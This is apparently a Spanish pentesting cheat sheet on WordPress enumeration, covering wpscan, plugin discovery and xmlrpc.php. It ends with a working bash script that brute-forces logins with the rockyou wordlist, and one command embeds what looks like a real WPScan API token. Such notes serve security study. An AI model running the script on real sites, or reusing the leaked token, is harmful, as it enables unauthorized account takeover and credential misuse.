#Web  #CMS #Reconocimiento

#### Definición

> WordPress es un gestor de contenido de código abierto y gratuito que permite a los usuarios crear y gestionar sitios web, blogs y tiendas online de manera sencilla, sin necesidad de conocimientos técnicos avanzados

## ENUMERACION

Podemos usar `whatweb` para poder sacar la máxima información sobre el servicio.
También podemos buscar la versión que encontremos en `searchesplot` o en `exploitdb`

Con [[WPSCAN]] podemos hacer una enumeración mas exhaustiva del WordPress.
- Enumeración General
	`wpscan --url <URL_WordPress>`
- Enumeración Usuarios, Plugins
	`wpscan --url <URL_WordPress> -e u,vp`
- Enumeración con API Token (+Info)
	`wpscan --url <URL_WordPress> --api-token  nTEwvVSSgY0CDaoapYR1CAU0hCSe229fw8aRmBfY1bs`
- Enumeración conociendo usuario
	`wpscan --url <URL_WordPress> -U <User> -P <Wordlist>`

Buscar plugins en el código fuente de forma manual
`curl -s -X GET "<URL_WordPress" | grep -oP 'plugins/\K[^/]+' | sort -u`

SI el archivo `xmlrpc.php` esta expuesto también se pueden enumerar credenciales validas.
Deberemos averiguar cuales son los métodos disponibles tramitando la petición por `POST` deberemos crear un archivo `file.xml` con la siguiente estructura `xml`.
```xml
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>  <params></params>  </methodCall>
```

Lo tramitamos por `POST` utilizando `curl` de la siguiente forma.
`curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml`

Nos devolverá los métodos disponibles de WordPress, deberemos buscar que se encuentre el método `wp.getUsersBlogs`, al existir este método nos podemos montar una estructura en`bash` para realizar el ataque de fuerza bruta..
```bash
#!/bin/bash

function ctrl_c(){
echo "[!] Saliendo..."
exit 1
}

# Ctrl + c
trap ctrl_c SIGINT

function createXML(){
password=$1
xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>USRUARIO_ENECONTRADO/value></param> ------- CAMBIAR USUARIO
<param><value>$password</value></param>
</params>
</methodCall>
"""

echo $xmlFile > file.xml
response=$(curl -s -X POST "<URL_WordPress>/xmlrpc.php" -d@file.xml)
if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
echo -e "\n[+] La contraseña es $password"
exit 0
fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
createXML $password
done
```
